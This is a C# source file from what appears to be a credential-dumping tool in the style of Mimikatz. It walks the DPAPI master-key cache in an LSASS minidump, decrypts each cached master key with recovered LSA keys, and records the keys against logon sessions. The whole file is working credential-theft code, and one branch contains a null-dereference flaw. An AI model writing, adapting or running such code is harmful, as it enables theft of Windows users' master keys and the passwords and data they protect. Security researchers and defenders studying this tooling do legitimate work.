using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using MiniDumpModule.Crypto;
using MiniDumpModule.Templates;
using static MiniDumpModule.Helpers;

namespace MiniDumpModule.Decryptor
{
    public class Dpapi_
    {
        public static int FindCredentials(MiniDump minidump, dpapi.DpapiTemplate template)
        {
            foreach (var module in new List<string> { "lsasrv.dll", "dpapisrv.dll" })
            {
                var position = find_signature(minidump, module, template.signature);
                long llcurrent;
                if (position == 0)
                    continue;

                var ptr_entry_loc = get_ptr_with_offset(minidump.BinaryReader, (position + template.first_entry_offset), minidump.SystemInfo);
                var ptr_entry = ReadInt64(minidump.BinaryReader, (long)ptr_entry_loc);

                llcurrent = ptr_entry;
                do
                {
                    var entryBytes = ReadBytes(minidump.BinaryReader, Rva2offset(minidump, llcurrent),
                        Marshal.SizeOf(typeof(dpapi.KIWI_MASTERKEY_CACHE_ENTRY)));

                    var dpapiEntry = ReadStruct<dpapi.KIWI_MASTERKEY_CACHE_ENTRY>(entryBytes);
                    //PrintProperties(dpapiEntry);

                    if (dpapiEntry.keySize > 1)
                    {
                        var dec_masterkey = BCrypt.DecryptCredentials(dpapiEntry.key, minidump.LsaKeys);
                        var dpapi = new Dpapi();
                        //dpapi.luid = $"{dpapiEntry.LogonId.HighPart}:{dpapiEntry.LogonId.LowPart}";
                        dpapi.masterkey = BitConverter.ToString(dec_masterkey).Replace("-", "");
                        dpapi.insertTime = $"{ToDateTime(dpapiEntry.insertTime):yyyy-MM-dd HH:mm:ss}";
                        dpapi.key_size = dpapiEntry.keySize.ToString();
                        dpapi.key_guid = dpapiEntry.KeyUid.ToString();
                        dpapi.masterkey_sha = BCrypt.GetHashSHA1(dec_masterkey);

                        var currentlogon = minidump.LogonList.FirstOrDefault(x => x.LogonId.HighPart == dpapiEntry.LogonId.HighPart && x.LogonId.LowPart == dpapiEntry.LogonId.LowPart);
                        if (currentlogon == null && !dpapi.insertTime.Contains("1601-01-01"))
                        {
                            currentlogon = new Logon(dpapiEntry.LogonId);
                            currentlogon.Dpapi = new List<Dpapi>();
                            currentlogon.Dpapi.Add(dpapi);
                            minidump.LogonList.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Dpapi == null)
                                currentlogon.Dpapi = new List<Dpapi>();

                            currentlogon.Dpapi.Add(dpapi);
                        }
                    }

                    llcurrent = dpapiEntry.Flink;
                } while (llcurrent != ptr_entry);
            }

            return 0;
        }
    }
}